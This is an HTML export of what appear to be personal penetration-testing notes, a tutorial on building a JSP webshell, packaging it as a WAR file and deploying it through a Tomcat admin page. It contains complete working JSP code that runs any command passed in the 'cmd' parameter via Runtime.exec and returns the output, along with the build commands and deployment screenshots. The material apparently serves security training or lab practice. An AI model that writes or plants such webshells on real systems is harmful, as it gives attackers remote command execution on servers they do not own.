<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title> Build webshell with jsp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'> Build webshell with jsp</h1><br/><strong><h2>Build a Webshell</h2></strong><br />we are going to see how we can build a Webshell to gain command execution on the server. <br />The Webshell will be a <strong>.jsp</strong> file packaged in a <strong>.war</strong> file:<br />• a <strong>jsp</strong> (Java Server Pages) file for dynamically generated web pages based on HTML, XML, SOAP... <span style="text-decoration:underline;">jsp</span> is similar to PHP and ASP, but uses Java.<br />• a <strong>war</strong>(Web application ARchive) file is a compressed package containing Java-based web components and applications that run on a web server.<br /><br />1. first we are going to build a <strong>jsp</strong> Webshell (index.jsp):<br />    <div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;FORM</span> <span style="color:#3ad900;font-weight:400">METHOD=GET</span> <span style="color:#3ad900;font-weight:400">ACTION=&#39;index.jsp&#39;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;INPUT</span> <span style="color:#3ad900;font-weight:400">name=&#39;cmd&#39;</span> <span style="color:#3ad900;font-weight:400">type=text</span><span style="color:#7f0044;font-weight:400">&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;INPUT</span> <span style="color:#3ad900;font-weight:400">type=submit</span> <span style="color:#3ad900;font-weight:400">value=&#39;Run&#39;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/FORM&gt;</span><br />&lt;%@ page import=&quot;java.io.*&quot; %&gt;<br />&lt;%<br />   String cmd = request.getParameter(&quot;cmd&quot;);<br />   String output = &quot;&quot;;<br />   if(cmd != null) {<br />      String s = null;<br />      try {<br />         Process p = Runtime.getRuntime().exec(cmd,null,null);<br />         BufferedReader sI = new BufferedReader(new<br />InputStreamReader(p.getInputStream()));<br />         while((s = sI.readLine()) != null) { output += s+&quot;<span style="color:#7f0044;font-weight:400">&lt;/br&gt;</span>&quot;; }<br />      }  catch(IOException e) {   e.printStackTrace();   }<br />   }<br />%&gt;<br /><span style="color:#7f0044;font-weight:400">&lt;pre&gt;</span>&lt;%=output %&gt;<span style="color:#7f0044;font-weight:400">&lt;/pre&gt;</span></pre></div><br />2. <span style="color:#495057;"> </span>now we have to create a directory name webshell and put the file (index.jsp) inside it:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">mkdir</span> webshell<br /><span style="color:#ff9d00;font-weight:700">cp</span> index.jsp webshell</pre></div><br />3. build the <strong>war</strong> file using jar (provide with java):<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> webshell<br />jar -cvf ..<span style="color:#ff9d00;font-weight:700">/</span>webshell.war *</pre></div><br /><br /><strong><h3>deploy the webshell created in the admin page</h3></strong><br /><a href="file://G:/Other computers/Yoga 520/CherryTree/screenshot/Black Boxes/webshell-tomcat.png"><img src="images/451-1.png" alt="images/451-1.png" /></a><br />after deployed we can find it here:<br /><a href="file://G:/Other computers/Yoga 520/CherryTree/screenshot/Black Boxes/webshell-tomcat2.png"><img src="images/451-2.png" alt="images/451-2.png" /></a><br />now if we append /webshell/index.jsp too the url we should have a full functional webshell:<br /><a href=""><img src="images/451-3.png" alt="images/451-3.png" /></a><br /><a href=""><img src="images/451-4.png" alt="images/451-4.png" /></a><br /></div>
</body>
</html>
